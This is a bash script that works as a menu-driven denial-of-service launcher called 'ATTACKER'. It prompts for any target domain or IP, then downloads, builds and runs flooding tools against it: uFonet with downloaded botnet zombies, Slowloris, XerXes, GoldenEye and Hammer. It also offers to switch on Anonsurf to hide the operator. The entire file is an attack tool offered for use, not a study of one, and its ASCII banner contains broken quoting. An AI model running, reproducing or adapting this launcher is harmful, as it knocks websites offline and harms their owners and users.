#!/usr/bin/env bash


#============================================================================================================
#	
#	Welcome To Routerz Script
#	 Script By : Routerz
#	=======================================
#	My Facebook Account ::-
#	http://facebook.com/AriR.Abdulla
#	=======================================
#	My Youtube Channel ::-
#	https://www.youtube.com/channel/UCdigZ3N0EVMIEsS4hlIaaHg
#
#============================================================================================================


#This colour


	YS="\e[1;33m"
	cyan='\e[0;36m'
	green='\e[0;34m'
	okegreen='\033[92m'
	lightgreen='\e[1;32m'
	white='\e[1;37m'
	red='\e[1;31m'
	yellow='\e[1;33m'
	BlueF='\e[1;34m'
	magenta='\e[1;35m'
	CE="\e[0m"
	BS="\e[0;34m"
	RS="\e[1;31m"


#Checking...
if [ $(id -u) -ne 0 ] ; then
echo -e "$red" && echo "[x] This Script Must Be Run As Root!" && echo "" && exit 0
fi
resize -s 34 80


# ctrl_c
trap ctrl_c INT
ctrl_c() {
	echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	exit 0
}

# Title
printf '\033]2;ATTACKER \a'
PS3="ATTACKER>> "

##################
###START BOTNET###
BotNet()
{
echo "" && echo -e "$cyan"
echo -n -e "  Please Enter A domain Exp, http://google.com or IP - "
read Domain
if [ -z "$Domain" ]; then
		
 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
					read back
						if [ -z "$back" ]; then
							exit
							fi
						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	                                                exit 0
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												clear
                                                attacker
		
	fi
fi
		echo "" && echo -e "$cyan"
		echo -e "  Checking uFonet .. "
	cd tools
	if [ ! -d "ufonet" ]; then
		echo -e $red"  uFonet Not Found ! .. " && echo ""
		echo -e "  Wait for downloading"
		echo "" && sleep 2
		wget --no-check-certificate https://sourceforge.net/projects/ufonet/files/latest/download
		unzip "download" && rm download && clear
	fi
		if [ -d "ufonet" ]; then
	echo ""
		echo -e "  uFonet found" && echo ""
		echo -e "     ...:$BlueF Attacking Now $cyan:..."
	echo ""
		cd ufonet
		chmod 777 ufonet
		./ufonet --download-zombies
		./ufonet -a $Domain
	else
		echo "We have a problem ! sorry"
	fi
}
####END BOTNET###
#################


##################
##START SLOWLORIS#
SlowLoris()
{
		echo "" && echo -e "$cyan"
				echo -n -e "  Please Enter A domain Exp, www.google.com or IP - "
		read DOmain
	if [ -z "$DOmain" ]; then
		
 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
					read back
						if [ -z "$back" ]; then
							exit
							fi
						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	                                                exit 0
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												clear
                                                attacker
		
	fi
fi
		echo "" && echo -e "$cyan"
			echo -e "  Checking Slowloris .. " && sleep 1
		cd tools
			if [ ! -f "slowloris.pl" ]; then
			echo ""
		echo -e "  slowloris.pl Not Found ! .. "
		echo ""
				echo -e "  Wait for downloading"
				echo "" && sleep 1
				git clone https://github.com/llaera/slowloris.pl
		cd slowloris.pl
		else
				echo "" && echo -e "  Slowloris found" && echo ""
				echo -e "     ...:$BlueF Attacking Now $cyan:..."
		fi
				if [ -e "slowloris.pl" ]; then
		echo ""
				perl slowloris.pl -dns $DOmain
		else
				echo "$red"
				echo "  We have a problem ! sorry"
		fi
}
##END SLOWLORIS##
#################


##################
###START XerXes###
XerXes()
{
		echo "" && echo -e "$cyan"
				echo -n -e "  Please Enter A domain Exp, google.com or IP - "
		read DOMain
	if [ -z "$DOMain" ]; then
		
 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
					read back
						if [ -z "$back" ]; then
							exit
							fi
						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	                                                exit 0
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												clear
                                                attacker
		
	fi
fi
		echo "" && echo -e "$cyan"
		echo -e "  Checking XerXes .. " && sleep 1
	cd tools	
		if [ ! -d "xerxes" ]; then
		echo -e "  XerXes Not Found ! .. "
	echo ""
		echo "  Wait for downloading"
	sleep 1 && echo ""
		git clone https://github.com/zanyarjamal/xerxes.git
	clear
	fi
		if [ -d "xerxes" ]; then
		echo ""
			echo -e "  XerXes found"
		echo ""
		echo -e "     ...:$BlueF Attacking Now $cyan:..."
		echo ""
		cd xerxes
		if [ ! -f "xerxes" ]; then
		gcc xerxes.c -o xerxes
	fi
				chmod 777 xerxes
				./xerxes $DOMain 80
			else
				echo "We have a problem ! sorry"
		fi
}
####END XerXes###
#################


##################
#START GoldenEye##
GoldenEYE()
{
		echo "" && echo -e "$cyan"
				echo -n -e "  Please Enter A domain Exp, https://google.com or IP - "
		read DOMAin
	if [ -z "$DOMAin" ]; then
		
 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
					read back
						if [ -z "$back" ]; then
							exit
							fi
						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	                                                exit 0
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												clear
                                                attacker
		
	fi
fi
		echo "" && echo -e "$cyan"
		sudo apt-get install goldeneye
		clear && echo "" && echo -e "$cyan"
		echo -e "     ...:$BlueF Attacking Now $cyan:..."
		goldeneye $DOMAin
}
##END GoldenEye##
#################


##################
###START HAMMER###
HAMMER()
{
		echo "" && echo -e "$cyan"
				echo -n -e "  Please Enter A IP Exp, 216.58.198.68 - "
		read DOMAIn
	if [ -z "$DOMAIn" ]; then
		
 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
					read back
						if [ -z "$back" ]; then
							exit
							fi
						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	                                                exit 0
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												clear
                                                attacker
		
	fi
fi
		echo "" && echo -e "$cyan"
		echo -e "  Checking Hammer .. " && sleep 1
	cd tools
		if [ ! -d "hammer" ]; then
		echo -e "  Hammer Not Found ! .. "
	echo ""
		echo "  Wait for downloading"
	sleep 1 && echo ""
		git clone https://github.com/cyweb/hammer
	clear
	fi
		if [ -d "hammer" ]; then
		echo ""
			echo -e "  Hammer found"
		echo ""
		echo -e "     ...:$BlueF Attacking Now $cyan:..."
		echo ""
		cd hammer
				chmod 777 hammer.py
				./hammer.py -s $DOMAIn
			else
				echo "We have a problem ! sorry"
		fi

}



####END HAMMER###
#################


##################
##START Anonsurf##
START()
{
		echo "" && echo -e "$cyan"
		echo -n -e $red"  Do You Want To Start Anonsurf Mode?$cyan ( YES / NO ) : " ;tput sgr0
		read anon
	if [ -z "$anon" ]; then
		
 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
					read back
						if [ -z "$back" ]; then
							exit
							fi
						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	                                                exit 0
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												clear
                                                attacker
		fi
	fi
						if [ $anon != 'n' ] && [ $anon != 'N' ] && [ $anon != 'no' ] && [ $anon != 'No' ]
												then
													anonsurf start
													clear
													attacker
										elif [ $anon != 'y' ] && [ $anon != 'Y' ] && [ $anon != 'yes' ] && [ $anon != 'Yes' ]
												then
												clear
                                                attacker
		fi
}
###END Anonsurf##
#################

##################
##STOP Anonsurf##
STOP()
{
		echo "" && echo -e "$cyan"
		echo -n -e $red"  Do You Want To STOP Anonsurf Mode?$cyan ( YES / NO ) : " ;tput sgr0
		read Anon
	if [ -z "$Anon" ]; then
		
 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
					read back
						if [ -z "$back" ]; then
							exit
							fi
						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	                                                exit 0
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												clear
                                                attacker
		fi
	fi
						if [ $Anon != 'n' ] && [ $Anon != 'N' ] && [ $Anon != 'no' ] && [ $Anon != 'No' ]
												then
													anonsurf stop
													clear
													attacker
										elif [ $Anon != 'y' ] && [ $Anon != 'Y' ] && [ $Anon != 'yes' ] && [ $Anon != 'Yes' ]
												then
												clear
                                                attacker
		fi
}
###END Anonsurf##
#################


#######################
#######################
attacker()
{
clear && echo "" && echo -e "$BlueF"
echo "_______                         __                                   /       \  "                     /  |                                  
echo "$$$$$$$  |  ______   __    __  _$$ |_     ______    ______   ________ "
echo "$$ |__$$ | /      \ /  |  /  |/ $$   |   /      \  /      \ /        |"
echo "$$    $$< /$$$$$$  |$$ |  $$ |$$$$$$/   /$$$$$$  |/$$$$$$  |$$$$$$$$/ "
echo "$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __ $$    $$ |$$ |  $$/   /  $$/ " 
echo "$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |$$$$$$$$/ $$ |       /$$$$/__ "
echo "$$ |  $$ |$$    $$/ $$    $$/   $$  $$/ $$       |$$ |      /$$      |"
echo "$$/   $$/  $$$$$$/   $$$$$$/     $$$$/   $$$$$$$/ $$/       $$$$$$$$/ "                                                                                                      ░                               "
echo ""
echo -e "$green       |--------- Author: @Routerz | Instagram:,@realrouterz ---------|"
echo "" && echo "" && echo "" && echo -e "$green" && sleep 0.9
echo -e $BlueF"	[$white"01"$BlueF]$cyan  BotNet             $BlueF	[$white"05"$BlueF]$cyan  Hammer"
echo -e $BlueF"	[$white"02"$BlueF]$cyan  SlowLoris          $BlueF	[$white"06"$BlueF]$cyan  Start AnonSurf"
echo -e $BlueF"	[$white"03"$BlueF]$cyan  XerXes             $BlueF	[$white"07"$BlueF]$cyan  Stop Anonsurf"
echo -e $BlueF"	[$white"04"$BlueF]$cyan  GoldenEye          $BlueF	[$white"08"$BlueF]$cyan  Exit"
echo -e " " && echo -e ""
echo -n -e $red'  \033[4mATTACKER:\033[0m >> '; tput sgr0 #insert your choice
read ATTACKER



	if [[ "$ATTACKER" == "Exit" || "$ATTACKER" == "8" ]]; then
	echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	exit 0
	elif [ "$ATTACKER" = "1" ]; then
BotNet
	elif [ "$ATTACKER" = "2" ]; then
SlowLoris
	elif [ "$ATTACKER" = "3" ]; then
XerXes
	elif [ "$ATTACKER" = "4" ]; then
GoldenEYE
	elif [ "$ATTACKER" = "5" ]; then
HAMMER
	elif [ "$ATTACKER" = "6" ]; then
START
	elif [ "$ATTACKER" = "7" ]; then
STOP


else
			echo -e ""
 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
					read back
						if [ -z "$back" ]; then
							exit
							fi
						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
	                                                exit 0
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												clear
                                                attacker
	fi
fi
}


#######################
####################### 
attacker
